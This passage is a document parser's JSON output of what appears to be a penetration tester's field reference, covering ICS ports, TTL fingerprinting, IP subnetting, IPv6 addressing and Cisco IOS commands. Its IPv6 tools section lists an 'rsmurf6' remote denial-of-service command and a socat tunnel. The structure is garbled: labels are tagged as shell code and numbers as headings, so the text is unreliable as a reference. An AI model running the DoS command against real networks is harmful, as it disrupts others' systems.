      "type": "paragraph",
      "content": "DHCP/BOOTP",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "69",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "code_block",
      "content": "TFTP (UDP)",
      "level": 0,
      "metadata": {
        "language": "shell",
        "single_line": true,
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "80",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "OPC UA XML",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "102",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "ICCP",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "443",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "OPC UA XML",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "502",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Modbus TCP",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Port#",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Service",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "1089-1091",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "code_block",
      "content": "Foundation Fieldbus HSE (UDP/TCP)",
      "level": 0,
      "metadata": {
        "language": "shell",
        "single_line": true,
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "2222",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "code_block",
      "content": "Ethernet/IP (UDP)",
      "level": 0,
      "metadata": {
        "language": "shell",
        "single_line": true,
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "4000",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "code_block",
      "content": "ROC Plus (UDP/TCP)",
      "level": 0,
      "metadata": {
        "language": "shell",
        "single_line": true,
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "4840",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "OPC UA Discovery Server",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "20000",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "code_block",
      "content": "DNP3 (UDP/TCP)",
      "level": 0,
      "metadata": {
        "language": "shell",
        "single_line": true,
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "34962-34964",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "code_block",
      "content": "PROFINET (UDP/TCP)",
      "level": 0,
      "metadata": {
        "language": "shell",
        "single_line": true,
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "34980",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "code_block",
      "content": "EtherCAT (UDP)",
      "level": 0,
      "metadata": {
        "language": "shell",
        "single_line": true,
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "44818",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "code_block",
      "content": "Ethernet/IP (UDP/TCP)",
      "level": 0,
      "metadata": {
        "language": "shell",
        "single_line": true,
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "47808",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "code_block",
      "content": "BACnet/IP (UDP)",
      "level": 0,
      "metadata": {
        "language": "shell",
        "single_line": true,
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "55000-55003",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "code_block",
      "content": "FL-net (UDP)",
      "level": 0,
      "metadata": {
        "language": "shell",
        "single_line": true,
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "More info at: https://github.com/ITI/ICS-Security-Tools/blob/master/protocols/PORTS.md",
      "level": 0,
      "metadata": {
        "urls": [
          "https://github.com/ITI/ICS-Security-Tools/blob/master/protocols/PORTS.md"
        ],
        "file_paths": [
          "//github.com/ITI/ICS-Security-Tools/blob/master/protocols/PORTS.md"
        ],
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "TTL Fingerprinting",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "128",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Windows",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "64",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Linux",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "255",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Network",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "255",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Solaris",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "IPv4",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Classful IPv4 Ranges",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "heading",
      "content": "– 127.255.255.255",
      "level": 4,
      "metadata": {
        "number": "0.0.0.0"
      }
    },
    {
      "type": "paragraph",
      "content": "Class A Range",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "heading",
      "content": "– 191.255.255.255",
      "level": 4,
      "metadata": {
        "number": "128.0.0.0"
      }
    },
    {
      "type": "paragraph",
      "content": "Class B Range",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "heading",
      "content": "– 223.255.255.255",
      "level": 4,
      "metadata": {
        "number": "192.0.0.0"
      }
    },
    {
      "type": "paragraph",
      "content": "Class C Range",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "heading",
      "content": "– 239.255.255.255",
      "level": 4,
      "metadata": {
        "number": "224.0.0.0"
      }
    },
    {
      "type": "paragraph",
      "content": "Class D Range",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "heading",
      "content": "– 255.255.255.255",
      "level": 4,
      "metadata": {
        "number": "240.0.0.0"
      }
    },
    {
      "type": "paragraph",
      "content": "Class E Range",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Reserved Private Ranges",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "heading",
      "content": "– 10.255.255.255",
      "level": 4,
      "metadata": {
        "number": "10.0.0.0"
      }
    },
    {
      "type": "paragraph",
      "content": "Class A Range",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "heading",
      "content": "– 172.31.255.255",
      "level": 4,
      "metadata": {
        "number": "172.16.0.0"
      }
    },
    {
      "type": "paragraph",
      "content": "Class B Range",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "heading",
      "content": "- 192.168.255.255",
      "level": 4,
      "metadata": {
        "number": "192.168.0.0"
      }
    },
    {
      "type": "paragraph",
      "content": "Class C Range",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "heading",
      "content": "– 127.255.255.255",
      "level": 4,
      "metadata": {
        "number": "127.0.0.0"
      }
    },
    {
      "type": "paragraph",
      "content": "Loopback Range",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Subnetting",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "/31",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "255.255.255.254",
      "level": 0,
      "metadata": {
        "file_paths": [
          "255.255.255.254"
        ],
        "source_type": "TXT"
      }
    },
    {
      "type": "heading",
      "content": "Useable Hosts",
      "level": 1,
      "metadata": {
        "number": "0"
      }
    },
    {
      "type": "paragraph",
      "content": "/30",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "255.255.255.252",
      "level": 0,
      "metadata": {
        "file_paths": [
          "255.255.255.252"
        ],
        "source_type": "TXT"
      }
    },
    {
      "type": "heading",
      "content": "Hosts",
      "level": 1,
      "metadata": {
        "number": "2"
      }
    },
    {
      "type": "paragraph",
      "content": "/29",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "255.255.255.248",
      "level": 0,
      "metadata": {
        "file_paths": [
          "255.255.255.248"
        ],
        "source_type": "TXT"
      }
    },
    {
      "type": "heading",
      "content": "Hosts",
      "level": 1,
      "metadata": {
        "number": "6"
      }
    },
    {
      "type": "paragraph",
      "content": "/28",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "255.255.255.240",
      "level": 0,
      "metadata": {
        "file_paths": [
          "255.255.255.240"
        ],
        "source_type": "TXT"
      }
    },
    {
      "type": "heading",
      "content": "Hosts",
      "level": 1,
      "metadata": {
        "number": "14"
      }
    },
    {
      "type": "paragraph",
      "content": "/27",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "255.255.255.224",
      "level": 0,
      "metadata": {
        "file_paths": [
          "255.255.255.224"
        ],
        "source_type": "TXT"
      }
    },
    {
      "type": "heading",
      "content": "Hosts",
      "level": 1,
      "metadata": {
        "number": "30"
      }
    },
    {
      "type": "paragraph",
      "content": "/26",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "255.255.255.192",
      "level": 0,
      "metadata": {
        "file_paths": [
          "255.255.255.192"
        ],
        "source_type": "TXT"
      }
    },
    {
      "type": "heading",
      "content": "Hosts",
      "level": 1,
      "metadata": {
        "number": "62"
      }
    },
    {
      "type": "paragraph",
      "content": "/25",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "255.255.255.128",
      "level": 0,
      "metadata": {
        "file_paths": [
          "255.255.255.128"
        ],
        "source_type": "TXT"
      }
    },
    {
      "type": "heading",
      "content": "Hosts",
      "level": 1,
      "metadata": {
        "number": "126"
      }
    },
    {
      "type": "paragraph",
      "content": "/24",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "255.255.255.0",
      "level": 0,
      "metadata": {
        "file_paths": [
          "255.255.255.0"
        ],
        "source_type": "TXT"
      }
    },
    {
      "type": "heading",
      "content": "Hosts",
      "level": 1,
      "metadata": {
        "number": "254"
      }
    },
    {
      "type": "paragraph",
      "content": "/23",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "255.255.254.0",
      "level": 0,
      "metadata": {
        "file_paths": [
          "255.255.254.0"
        ],
        "source_type": "TXT"
      }
    },
    {
      "type": "heading",
      "content": "Hosts",
      "level": 1,
      "metadata": {
        "number": "510"
      }
    },
    {
      "type": "paragraph",
      "content": "/22",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "255.255.252.0",
      "level": 0,
      "metadata": {
        "file_paths": [
          "255.255.252.0"
        ],
        "source_type": "TXT"
      }
    },
    {
      "type": "heading",
      "content": "Hosts",
      "level": 1,
      "metadata": {
        "number": "1022"
      }
    },
    {
      "type": "paragraph",
      "content": "/21",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "255.255.248.0",
      "level": 0,
      "metadata": {
        "file_paths": [
          "255.255.248.0"
        ],
        "source_type": "TXT"
      }
    },
    {
      "type": "heading",
      "content": "Hosts",
      "level": 1,
      "metadata": {
        "number": "2046"
      }
    },
    {
      "type": "paragraph",
      "content": "/20",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "255.255.240.0",
      "level": 0,
      "metadata": {
        "file_paths": [
          "255.255.240.0"
        ],
        "source_type": "TXT"
      }
    },
    {
      "type": "heading",
      "content": "Hosts",
      "level": 1,
      "metadata": {
        "number": "4094"
      }
    },
    {
      "type": "paragraph",
      "content": "/19",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "255.255.224.0",
      "level": 0,
      "metadata": {
        "file_paths": [
          "255.255.224.0"
        ],
        "source_type": "TXT"
      }
    },
    {
      "type": "heading",
      "content": "Hosts",
      "level": 1,
      "metadata": {
        "number": "8190"
      }
    },
    {
      "type": "paragraph",
      "content": "/18",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "255.255.192.0",
      "level": 0,
      "metadata": {
        "file_paths": [
          "255.255.192.0"
        ],
        "source_type": "TXT"
      }
    },
    {
      "type": "heading",
      "content": "Hosts",
      "level": 1,
      "metadata": {
        "number": "16382"
      }
    },
    {
      "type": "paragraph",
      "content": "/17",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "255.255.128.0",
      "level": 0,
      "metadata": {
        "file_paths": [
          "255.255.128.0"
        ],
        "source_type": "TXT"
      }
    },
    {
      "type": "heading",
      "content": "Hosts",
      "level": 1,
      "metadata": {
        "number": "32766"
      }
    },
    {
      "type": "paragraph",
      "content": "/16",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "255.255.0.0",
      "level": 0,
      "metadata": {
        "file_paths": [
          "255.255.0.0"
        ],
        "source_type": "TXT"
      }
    },
    {
      "type": "heading",
      "content": "Hosts",
      "level": 1,
      "metadata": {
        "number": "65534"
      }
    },
    {
      "type": "paragraph",
      "content": "/15",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "255.254.0.0",
      "level": 0,
      "metadata": {
        "file_paths": [
          "255.254.0.0"
        ],
        "source_type": "TXT"
      }
    },
    {
      "type": "heading",
      "content": "Hosts",
      "level": 1,
      "metadata": {
        "number": "131070"
      }
    },
    {
      "type": "paragraph",
      "content": "/14",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "255.252.0.0",
      "level": 0,
      "metadata": {
        "file_paths": [
          "255.252.0.0"
        ],
        "source_type": "TXT"
      }
    },
    {
      "type": "heading",
      "content": "Hosts",
      "level": 1,
      "metadata": {
        "number": "262142"
      }
    },
    {
      "type": "paragraph",
      "content": "/13",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "255.248.0.0",
      "level": 0,
      "metadata": {
        "file_paths": [
          "255.248.0.0"
        ],
        "source_type": "TXT"
      }
    },
    {
      "type": "heading",
      "content": "Hosts",
      "level": 1,
      "metadata": {
        "number": "524286"
      }
    },
    {
      "type": "paragraph",
      "content": "/12",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "255.240.0.0",
      "level": 0,
      "metadata": {
        "file_paths": [
          "255.240.0.0"
        ],
        "source_type": "TXT"
      }
    },
    {
      "type": "heading",
      "content": "Hosts",
      "level": 1,
      "metadata": {
        "number": "1048574"
      }
    },
    {
      "type": "paragraph",
      "content": "/11",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "255.224.0.0",
      "level": 0,
      "metadata": {
        "file_paths": [
          "255.224.0.0"
        ],
        "source_type": "TXT"
      }
    },
    {
      "type": "heading",
      "content": "Hosts",
      "level": 1,
      "metadata": {
        "number": "2097150"
      }
    },
    {
      "type": "paragraph",
      "content": "/10",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "255.192.0.0",
      "level": 0,
      "metadata": {
        "file_paths": [
          "255.192.0.0"
        ],
        "source_type": "TXT"
      }
    },
    {
      "type": "heading",
      "content": "Hosts",
      "level": 1,
      "metadata": {
        "number": "4194302"
      }
    },
    {
      "type": "paragraph",
      "content": "/9",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "255.128.0.0",
      "level": 0,
      "metadata": {
        "file_paths": [
          "255.128.0.0"
        ],
        "source_type": "TXT"
      }
    },
    {
      "type": "heading",
      "content": "Hosts",
      "level": 1,
      "metadata": {
        "number": "8388606"
      }
    },
    {
      "type": "paragraph",
      "content": "/8",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "255.0.0.0",
      "level": 0,
      "metadata": {
        "file_paths": [
          "255.0.0.0"
        ],
        "source_type": "TXT"
      }
    },
    {
      "type": "heading",
      "content": "Hosts",
      "level": 1,
      "metadata": {
        "number": "16777214"
      }
    },
    {
      "type": "paragraph",
      "content": "Calculating Subnet Range",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Given: 1.1.1.101/28",
      "level": 0,
      "metadata": {
        "file_paths": [
          "1.1.1.101"
        ],
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "/28 = 255.255.255.240 netmask",
      "level": 0,
      "metadata": {
        "file_paths": [
          "255.255.255.240"
        ],
        "source_type": "TXT"
      }
    },
    {
      "type": "heading",
      "content": "– 240 = 16 = subnet ranges of 16, i.e.",
      "level": 1,
      "metadata": {
        "number": "256"
      }
    },
    {
      "type": "list",
      "content": "1.1.1.0",
      "level": 0,
      "metadata": {
        "list_type": "bullet",
        "item_count": 1
      }
    },
    {
      "type": "list",
      "content": "1.1.1.16",
      "level": 0,
      "metadata": {
        "list_type": "bullet",
        "item_count": 1
      }
    },
    {
      "type": "list",
      "content": "1.1.1.32...",
      "level": 0,
      "metadata": {
        "list_type": "bullet",
        "item_count": 1
      }
    },
    {
      "type": "paragraph",
      "content": "Range where given IP falls: 1.1.1.96 – 1.1.1.111",
      "level": 0,
      "metadata": {
        "file_paths": [
          "1.1.1.96",
          "1.1.1.111"
        ],
        "source_type": "TXT"
      }
    },
    {
      "type": "code_block",
      "content": "More info at: https://www.calculator.net/ip-subnet-calculator.html",
      "level": 0,
      "metadata": {
        "language": "shell",
        "single_line": true,
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "IPv6",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Broadcast Addresses",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "ff02::1",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "link-local nodes",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "ff01::2",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "node-local routers",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "ff02::2",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "link-local routers",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "ff05::2",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "site-local routers",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Interface Addresses",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "fe80::",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "link-local",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "2001::",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "routable",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "::a.b.c.d",
      "level": 0,
      "metadata": {
        "file_paths": [
          "a.b.c.d"
        ],
        "source_type": "TXT"
      }
    },
    {
      "type": "code_block",
      "content": "IPv4 compatible IPv6 (Example: ::192.168.1.2)",
      "level": 0,
      "metadata": {
        "language": "shell",
        "single_line": true,
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "::ffff:a.b.c.d",
      "level": 0,
      "metadata": {
        "file_paths": [
          "a.b.c.d"
        ],
        "source_type": "TXT"
      }
    },
    {
      "type": "code_block",
      "content": "IPv4 mapped IPv6 (Example: ::FFFF:129.144.52.38)",
      "level": 0,
      "metadata": {
        "language": "shell",
        "single_line": true,
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "2000::/3",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Global Unicast",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "FC00::/7",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Unique Local",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "IPV6 Tools",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "rsmurf6 <INTERFACE_NAME> <REMOTE_IPV6>",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Remote Network DoS",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "socat TCP-LISTEN:<LISTEN_PORT>,reuseaddr,fork TCP6:[<IPv6_ADDRESS>]:<SEND_TO_PORT>",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "SOCAT tunnel IPv6 through IPv4 tools",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "More info at: https://github.com/vanhauser-thc/thc-ipv6",
      "level": 0,
      "metadata": {
        "urls": [
          "https://github.com/vanhauser-thc/thc-ipv6"
        ],
        "file_paths": [
          "//github.com"
        ],
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Networking",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Cisco Commands",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Most commands below show the various prompts at which the commands are executed. For example: #, (config)#, (config-if)#, etc. Most of these prompts end in # before the command is typed in.",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "quote",
      "content": "enable",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Enter privileged exec mode",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "code_block",
      "content": "(Known as Enable mode. Prompt will change to '#')",
      "level": 0,
      "metadata": {
        "language": "shell",
        "single_line": true,
        "source_type": "TXT"
      }
    },
    {
      "type": "heading",
      "content": "configure terminal",
      "level": 1,
      "metadata": {}
    },
    {
      "type": "paragraph",
      "content": "Enter global configuration mode",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "code_block",
      "content": "(config)# interface fa0/0",
      "level": 0,
      "metadata": {
        "language": "shell",
        "single_line": true,
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Configure FastEthernet 0/0",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "code_block",
      "content": "(config-if)# ip addr <IP_ADDRESS> <SUBNET_MASK>",
      "level": 0,
      "metadata": {
        "language": "shell",
        "single_line": true,
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Add IP to fa0/0",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "code_block",
      "content": "(config)#line vty 0 4",
      "level": 0,
      "metadata": {
        "language": "shell",
        "single_line": true,
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Configure vty line",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "code_block",
      "content": "(config-line)# login",
      "level": 0,
      "metadata": {
        "language": "shell",
        "single_line": true,
        "source_type": "TXT"
      }
    },
    {
      "type": "code_block",
      "content": "(config-line)# password <PASSWORD>",
      "level": 0,
      "metadata": {
        "language": "shell",
        "single_line": true,
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Set telnet password",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "code_block",
      "content": "#show session",
      "level": 0,
      "metadata": {
        "language": "shell",
        "single_line": true,
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Open sessions",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "code_block",
      "content": "#show version",
      "level": 0,
      "metadata": {
        "language": "shell",
        "single_line": true,
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "IOS version",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "code_block",
      "content": "#dir file systems",
      "level": 0,
      "metadata": {
        "language": "shell",
        "single_line": true,
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Available files",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "code_block",
      "content": "#dir all-filesystems",
      "level": 0,
      "metadata": {
        "language": "shell",
        "single_line": true,
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "File information",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "code_block",
      "content": "#dir /all",
      "level": 0,
      "metadata": {
        "language": "shell",
        "single_line": true,
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "List deleted, undeleted files and files with errors",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "code_block",
      "content": "#show running-config",
      "level": 0,
      "metadata": {
        "language": "shell",
        "single_line": true,
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Config loaded in mem",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "code_block",
      "content": "#show startup-config",
      "level": 0,
      "metadata": {
        "language": "shell",
        "single_line": true,
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Config loaded at boot",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "code_block",
      "content": "#show ip interface brief",
      "level": 0,
      "metadata": {
        "language": "shell",
        "single_line": true,
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Interfaces",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "code_block",
      "content": "#show interface <INTERFACE_NAME>",
      "level": 0,
      "metadata": {
        "language": "shell",
        "single_line": true,
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Detailed interface info",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "code_block",
      "content": "#show ip route",
      "level": 0,
      "metadata": {
        "language": "shell",
        "single_line": true,
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Routes",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "code_block",
      "content": "#show access-lists",
      "level": 0,
      "metadata": {
        "language": "shell",
        "single_line": true,
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Access lists",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "code_block",
      "content": "#terminal length 0",
      "level": 0,
      "metadata": {
        "language": "shell",
        "single_line": true,
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "No limit on output",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "code_block",
      "content": "#copy running-config startup-config",
      "level": 0,
      "metadata": {
        "language": "shell",
        "single_line": true,
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Replace start config with running config",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "code_block",
      "content": "#copy running-config tftp",
      "level": 0,
      "metadata": {
        "language": "shell",
        "single_line": true,
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
